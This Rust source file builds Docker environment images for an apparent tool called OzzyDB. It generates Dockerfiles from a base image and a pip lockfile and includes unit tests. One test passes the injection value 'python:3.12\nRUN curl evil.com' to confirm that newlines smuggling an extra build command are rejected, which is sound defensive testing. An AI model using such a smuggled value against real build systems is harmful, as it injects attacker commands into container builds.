//! Environment building — Docker image construction from environment definitions.
//!
//! Environments define the container image that transform code runs in.
//! Three tiers:
//! - **BaseLockfile**: OzzyDB base image + user lockfile → auto-generated Dockerfile
//! - **Dockerfile**: User-provided Dockerfile (fetched from git)
//! - **Prebuilt**: Pre-existing image reference (no build needed)

pub mod docker;
pub mod hash;

use ozzy_core::toml_spec::{BaseLockfileInstaller, EnvironmentTier};

/// Result of building (or resolving) an environment image.
#[derive(Debug, Clone)]
pub struct BuiltEnvironment {
    /// The environment hash (content-addressed key).
    pub env_hash: String,
    /// The Docker image reference (e.g., "ozzydb-env:abc123" or "user/image:tag").
    pub image_ref: String,
    /// The build type: "base_lockfile", "dockerfile", or "prebuilt".
    pub build_type: String,
    /// Base image used (for base_lockfile tier only).
    pub base_image: Option<String>,
    /// Build duration in milliseconds (None if prebuilt or already cached).
    pub build_duration_ms: Option<i32>,
    /// Build log content (for filing to storage).
    pub build_log: Option<String>,
}

/// Classify an environment tier into its build_type string.
pub fn build_type_str(tier: &EnvironmentTier) -> &'static str {
    match tier {
        EnvironmentTier::BaseLockfile { .. } => "base_lockfile",
        EnvironmentTier::Dockerfile { .. } => "dockerfile",
        EnvironmentTier::Prebuilt { .. } => "prebuilt",
    }
}

/// Generate a Dockerfile for a BaseLockfile environment.
///
/// The installer strategy is resolved at publication time and becomes part of
/// the published environment definition. Build-time realization should not
/// inspect authored file paths.
pub fn generate_dockerfile(
    base_image: &str,
    installer: &BaseLockfileInstaller,
) -> Result<String, &'static str> {
    // Validate base_image: reject newlines and other Dockerfile injection vectors
    if base_image.contains('\n') || base_image.contains('\r') {
        return Err("base_image must not contain newlines");
    }

    let install_cmd = match installer {
        BaseLockfileInstaller::PipRequirements => "RUN pip install --no-cache-dir -r /tmp/lockfile",
    };

    Ok(format!(
        "FROM {base_image}\n\
         COPY lockfile /tmp/lockfile\n\
         {install_cmd}\n"
    ))
}

/// Generate a Dockerfile for Tier 2 (user-provided Dockerfile content).
///
/// The content is used as-is — it's the user's full Dockerfile.
pub fn dockerfile_from_content(dockerfile_content: &str) -> String {
    dockerfile_content.to_string()
}

/// The image tag pattern for OzzyDB-built environments.
pub fn image_tag(env_hash: &str) -> String {
    format!("ozzydb-env:{}", env_hash)
}

#[cfg(test)]
mod tests {
    use super::*;

    // -- generate_dockerfile --

    #[test]
    fn test_dockerfile_pip_requirements_installer() {
        let df = generate_dockerfile("python:3.12-slim", &BaseLockfileInstaller::PipRequirements)
            .unwrap();
        assert!(df.starts_with("FROM python:3.12-slim\n"));
        assert!(df.contains("pip install --no-cache-dir -r /tmp/lockfile"));
        assert!(df.contains("COPY lockfile /tmp/lockfile"));
    }

    #[test]
    fn test_dockerfile_rejects_newline_in_base_image() {
        let result = generate_dockerfile(
            "python:3.12\nRUN curl evil.com",
            &BaseLockfileInstaller::PipRequirements,
        );
        assert!(result.is_err());
        assert_eq!(result.unwrap_err(), "base_image must not contain newlines");
    }

    // -- image_tag --

    #[test]
    fn test_image_tag() {
        assert_eq!(image_tag("abc123"), "ozzydb-env:abc123");
    }

    // -- build_type_str --

    #[test]
    fn test_build_type_str() {
        assert_eq!(
            build_type_str(&EnvironmentTier::BaseLockfile {
                base: "x".into(),
                lockfile: "y".into()
            }),
            "base_lockfile"
        );
        assert_eq!(
            build_type_str(&EnvironmentTier::Dockerfile {
                dockerfile: "x".into()
            }),
            "dockerfile"
        );
        assert_eq!(
            build_type_str(&EnvironmentTier::Prebuilt { image: "x".into() }),
            "prebuilt"
        );
    }
}
